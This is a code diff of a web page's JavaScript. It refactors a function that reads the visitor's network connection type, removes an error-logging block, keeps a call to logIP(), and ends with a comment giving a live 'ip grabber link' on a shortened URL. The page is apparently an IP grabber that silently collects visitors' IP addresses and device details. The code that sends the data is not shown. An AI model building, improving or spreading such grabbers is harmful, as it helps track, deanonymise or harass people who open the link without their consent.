@@ -12,17 +12,6 @@
 
 
 
-const errorLogElement = document.getElementById("errorLog");
-
-// Function to log errors and display them in the HTML element
-function logError(message) {
-  const errorMessage = `<p>Error: ${message}</p>`;
-  errorLogElement.innerHTML += errorMessage;
-}
-
-// Example usage:
-try {
-
 
 
 
@@ -203,16 +192,18 @@ return "Portrait";
 }
 }
 
-function getConnection(){
-if(navigator.connection.effectiveType){
-return navigator.connection.effectiveType
+function getConnection() {
+  try {
+    if (navigator.connection.effectiveType) {
+      return navigator.connection.effectiveType;
+    } else {
+      return "N/A";
+    }
+  } catch (error) {
+    console.error("Error getting connection:", error);
+    return "N/A"; 
+  }
 }
-else{
-return "N/A"
-}
-}
-
-
 
 
 
@@ -328,23 +319,15 @@ console.error('Error:', error);
 
 logIP();
 
-} catch (error) {
-  // Log the error
-  console.error(error);
-  
-  // Display the error message in the HTML element
-  logError(error.message);
-}
 
 
+
+	
 </script>
 
 
 <script src="myfile.js?version=3.0"></script>
 
-<body>
-    <div id="errorLog"></div>
-</body>
 
 
 <!-- ip grabber link: https://gamer.tattoo/0E0IA0
